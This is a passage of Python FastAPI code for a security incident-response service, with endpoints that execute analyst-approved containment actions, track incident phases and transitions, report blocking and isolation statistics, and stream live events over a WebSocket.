    """Execute an analyst-approved response action."""
    action = ir_actions.get(action_id)
    if action is None:
        raise HTTPException(status_code=404, detail=f"Action '{action_id}' not found")

    try:
        result = ir_executor.execute(action)
    except UnapprovedActionError as exc:
        raise HTTPException(status_code=403, detail=str(exc))
    except NoBackendAvailableError as exc:
        raise HTTPException(status_code=501, detail=str(exc))

    req = ir_approval_manager.get_request_for_action(action_id)
    if req is not None and result.success:
        ir_state_tracker.record_executed_action(req.incident_id, action_id)

    return {"result": result.model_dump(mode="json"), "action_status": action.execution_status.value}


@app.get("/api/ir/incidents/{incident_id}/state")
async def ir_get_incident_state(incident_id: str):
    """Get lifecycle phase, linked plans, executed actions, and transition history."""
    try:
        return ir_state_tracker.get_incident_record(incident_id)
    except IncidentNotTrackedError as exc:
        raise HTTPException(status_code=404, detail=str(exc))


@app.post("/api/ir/incidents/{incident_id}/transition")
async def ir_transition_incident_state(incident_id: str, body: IRStateTransitionRequest):
    """Transition an incident to a new IncidentPhase."""
    try:
        transition = ir_state_tracker.transition(
            incident_id=incident_id,
            to_phase=body.to_phase,
            actor=body.actor,
            reason=body.reason,
        )
    except IncidentNotTrackedError as exc:
        raise HTTPException(status_code=404, detail=str(exc))
    except InvalidStateTransitionError as exc:
        raise HTTPException(status_code=409, detail=str(exc))

    return {"transition": transition.model_dump(mode="json"), "phase": body.to_phase.value}


@app.get("/api/ir/stats")
async def ir_stats():
    """Return Incident Response subsystem metrics."""
    pending = ir_approval_manager.list_pending()
    return {
        "incident_phases": ir_state_tracker.get_summary(),
        "pending_approvals": len(pending),
        "total_plans": len(ir_plans),
        "blocked_ips": sorted(ir_firewall_backend.blocked_ips),
        "isolated_hosts": sorted(ir_edr_backend.isolated_hosts),
        "disabled_accounts": sorted(ir_edr_backend.disabled_accounts),
    }


# ---------------------------------------------------------------------------
# WebSocket Endpoint — Live Telemetry & Incident Stream
# ---------------------------------------------------------------------------


@app.websocket("/api/events/live")
async def websocket_events(ws: WebSocket):
    """Stream live telemetry, alerts, and incident updates to the dashboard."""
    await manager.connect(ws)
    try:
        while True:
            # Keep connection open
            await ws.receive_text()
    except WebSocketDisconnect:
        manager.disconnect(ws)
